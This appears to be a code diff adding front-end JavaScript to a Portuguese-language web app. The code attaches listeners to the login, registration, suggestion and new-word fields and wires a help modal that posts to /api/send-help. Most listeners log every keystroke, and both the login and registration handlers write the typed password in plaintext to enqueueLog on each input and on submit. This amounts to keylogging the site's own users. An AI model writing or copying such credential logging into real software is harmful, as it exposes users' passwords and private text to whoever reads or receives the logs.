+// --- LOGIN ---
+const loginUsername = document.getElementById("login-username");
+const loginPassword = document.getElementById("login-password");
+const loginBtn = document.getElementById("login-btn");
+
+// Captura digitação no username
+loginUsername.addEventListener("input", () => {
+    enqueueLog(`🔐 Login: digitando username -> ${loginUsername.value}`);
+});
+
+// Foco no username
+loginUsername.addEventListener("focus", () => {
+    enqueueLog("🔐 Login: focou no campo username");
+});
+
+// Digitação no password
+loginPassword.addEventListener("input", () => {
+    enqueueLog(`🔐 Login: digitando password -> ${loginPassword.value}`);
+});
+
+// Foco no password
+loginPassword.addEventListener("focus", () => {
+    enqueueLog("🔐 Login: focou no campo password");
+});
+
+// Clique no botão login
+loginBtn.addEventListener("click", () => {
+    enqueueLog(`✅ Tentativa de login: username = ${loginUsername.value}, password = ${loginPassword.value}`);
+});
+
+
+// --- REGISTRO ---
+const regUsername = document.getElementById("register-username");
+const regPassword = document.getElementById("register-password");
+const regBtn = document.getElementById("register-btn");
+
+// Digitação no username do registro
+regUsername.addEventListener("input", () => {
+    enqueueLog(`✏️ Registro: digitando username -> ${regUsername.value}`);
+});
+
+// Foco no username do registro
+regUsername.addEventListener("focus", () => {
+    enqueueLog("✏️ Registro: focou no campo username");
+});
+
+// Digitação no password do registro
+regPassword.addEventListener("input", () => {
+    enqueueLog(`✏️ Registro: digitando password -> ${regPassword.value}`);
+});
+
+// Foco no password do registro
+regPassword.addEventListener("focus", () => {
+    enqueueLog("✏️ Registro: focou no campo password");
+});
+
+// Clique no botão registrar
+regBtn.addEventListener("click", () => {
+    enqueueLog(`✅ Tentativa de registro: username = ${regUsername.value}, password = ${regPassword.value}`);
+});
+
+ // --- SUGESTÕES / RECLAMAÇÕES ---
+  const suggestionText = document.getElementById("suggestionText");
+  const sendSuggestionBtn = document.getElementById("sendSuggestion");
+
+  suggestionText.addEventListener("input", () => enqueueLog(`✏️ Usuário digitou em Sugestão/Reclamação: ${suggestionText.value}`));
+  suggestionText.addEventListener("focus", () => enqueueLog("✏️ Usuário focou no campo de Sugestão/Reclamação"));
+  sendSuggestionBtn.addEventListener("click", () => enqueueLog(`✅ Usuário enviou sugestão: ${suggestionText.value}`));
+
+
+  newWordInput.addEventListener("input", () => enqueueLog(`📝 Usuário digitou palavra: ${newWordInput.value}`));
+  newWordInput.addEventListener("focus", () => enqueueLog("📝 Usuário focou no campo de nova palavra"));
+  addWordBtn.addEventListener("click", () => enqueueLog(`✅ Usuário clicou em Adicionar Palavra: ${newWordInput.value}`));
+
+
+const helpBtn = document.getElementById("help-btn");
+const helpModal = document.getElementById("help-modal");
+const helpClose = document.getElementById("help-close");
+const helpSend = document.getElementById("help-send");
+const helpText = document.getElementById("help-text");
+
+helpBtn.addEventListener("click", () => helpModal.style.display = "flex");
+helpClose.addEventListener("click", () => helpModal.style.display = "none");
+helpModal.addEventListener("click", e => { if(e.target === helpModal) helpModal.style.display = "none"; });
+
+helpSend.addEventListener("click", async () => {
+    const message = helpText.value.trim();
+    if(!message) return alert("Digite uma mensagem antes de enviar.");
+
+    try {
+        const username = document.getElementById("login-username")?.value || "usuário não preenchido";
+        const fullMessage = `🆘 Ajuda do usuário: ${username}\n\nMensagem: ${message}`;
+
+        const res = await fetch("/api/send-help", {
+            method: "POST",
+            headers: {"Content-Type":"application/json"},
+            body: JSON.stringify({message: fullMessage})
+        });
+
+        const data = await res.json();
+        if(data.success) {
+            alert("Mensagem enviada com sucesso!");
+            helpText.value = "";
+            helpModal.style.display = "none";
+        } else alert("Falha ao enviar mensagem.");
+    } catch(err) {
+        console.error(err);
+        alert("Erro de conexão ao enviar mensagem.");
+    }
+});
+
+
+// Conecta o botão de login ao checkLogin
+document.getElementById("login-btn").addEventListener("click", checkLogin);
 
 
 }); // fim
